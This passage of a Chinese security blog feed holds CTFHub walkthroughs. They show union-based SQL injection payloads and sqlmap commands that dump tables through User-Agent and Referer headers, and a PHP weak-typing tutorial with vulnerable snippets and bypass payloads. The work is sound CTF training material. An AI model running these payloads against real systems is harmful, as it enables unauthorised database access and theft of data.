返回错误。<br><img src="https://img-blog.csdnimg.cn/20210127152937575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入类型为数字型注入</p><p>2.判断字段数<br>当<code>1 order by 2</code> 时，回显正常，当<code>1 order by 3</code>时，无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127153140753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127153316846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表， news,llvyiyrndd<br><img src="https://img-blog.csdnimg.cn/20210127153357173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;llvyiyrndd&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为mgrbaiuvpa<br><img src="https://img-blog.csdnimg.cn/20210127153448891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(mgrbaiuvpa) <span class="keyword">from</span> llvyiyrndd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127153551534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–UA注入</strong></p><blockquote><p>在sqlmap中lever&gt;=3才会去检查user-agent头是否存在注入漏洞</p></blockquote><p>首先检测是否有UA注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-532573947dea4d7b.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3</span></span><br></pre></td></tr></table></figure><p>user-agent处存在注入<br><img src="https://img-blog.csdnimg.cn/20210127160432116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3  --dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154207704.png" alt="在这里插入图片描述"><br>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154647309.png" alt="在这里插入图片描述"><br>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155148329.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd -C mgrbaiuvpa --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155209659.png" alt="在这里插入图片描述"></p><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127161950997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示请在referer输入ID，bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127162149802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>补充Referer头<br><img src="https://img-blog.csdnimg.cn/20210127162227937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127162404134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表， news,scghlrqxyi<br><img src="https://img-blog.csdnimg.cn/20210127162506792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;scghlrqxyi&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为vzbmlruwwt<br><img src="https://img-blog.csdnimg.cn/20210127162548886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(vzbmlruwwt) <span class="keyword">from</span> scghlrqxyi</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127162635557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>sqlmap–Refer注入</strong></p><blockquote><p>伪造http请求中的referer，level&gt;=3时，sqlmap尝试referer注入</p></blockquote><p>首先检测是否有Refer注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3</span></span><br></pre></td></tr></table></figure><p>Referer头存在注入<br><img src="https://img-blog.csdnimg.cn/20210127164244547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 --dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164340575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164517402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164603239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi -C vzbmlruwwt --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164810825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（二）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="SQL注入" scheme="https://swhat.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之弱类型绕过</title>
    <link href="https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <id>https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
    <published>2020-11-04T07:48:04.000Z</published>
    <updated>2021-03-27T03:44:30.948Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP弱类型绕过方法</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前做过没有总结，这几天做题经常遇见弱类型绕过，写篇博客总结一下(水一篇)，嘻嘻。</p></blockquote><p>提到php代码绕过，必然会提起<code>比较操作符</code>,下面来谈一谈比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p><h2 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="1.extract变量覆盖"></a>1.extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>extract()</td><td>函数从数组中将变量导入到当前的符号表</td></tr></tbody></table><p>在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中,然后判断$ flag和$ shiyan两个变量的内容是否相等。</p><p>extract()函数导致这段代码存在一个变量覆盖漏洞,构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></figure><p> $ flag和$ shiyan这两个变量的内容都会被设置成空字符串。这样,就满足$shiyan == $content的条件，输出flag。<br><img src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2-strcmp比较字符串"><a href="#2-strcmp比较字符串" class="headerlink" title="2.strcmp比较字符串"></a>2.strcmp比较字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>用法</th><th>返回值</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2</td></tr></tbody></table><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。<br> 所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?a[]=<span class="number">123</span> </span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-urldecode二次编码绕过"><a href="#3-urldecode二次编码绕过" class="headerlink" title="3.urldecode二次编码绕过"></a>3.urldecode二次编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>urldecode()</td><td>解码已编码的 URL 字符串</td></tr></tbody></table><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">42</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">41</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="4-md5-函数"><a href="#4-md5-函数" class="headerlink" title="4.md5()函数"></a>4.md5()函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your username.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>描述</th></tr></thead><tbody><tr><td>md5()</td><td>函数计算字符串的 MD5 散列</td></tr><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-数组返回NULL绕过"><a href="#5-数组返回NULL绕过" class="headerlink" title="5.数组返回NULL绕过"></a>5.数组返回NULL绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>ereg</td><td>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</td></tr><tr><td>strpos</td><td>函数查找字符串在另一字符串中第一次出现的位置。</td></tr></tbody></table><p>第4行代码，ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，将你的密码限制在这三种字符中。</p><p><strong>方法一</strong>：<br><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，所以我们需要绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：</p><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1</span>%<span class="number">00</span>--</span><br></pre></td></tr></table></figure><p><img 